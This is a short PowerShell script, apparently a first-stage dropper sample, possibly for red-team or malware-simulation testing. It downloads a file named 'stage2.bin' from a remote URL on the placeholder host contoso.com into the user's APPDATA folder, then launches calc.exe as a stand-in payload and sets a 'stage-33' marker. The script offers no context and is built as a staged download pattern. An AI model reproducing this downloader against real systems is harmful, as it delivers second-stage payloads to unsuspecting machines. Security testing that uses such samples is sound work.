
[CmdletBinding()]
param(
    [string]$RemoteUrl = 'http://contoso.com:80/updater.ps1',
    [string]$PayloadPath = "$env:APPDATA\stage2.bin"
)
(New-Object System.Net.WebClient).DownloadFile($RemoteUrl, $PayloadPath)
Start-Process -FilePath "calc.exe" -ErrorAction SilentlyContinue
$StageMarker = "stage-33"
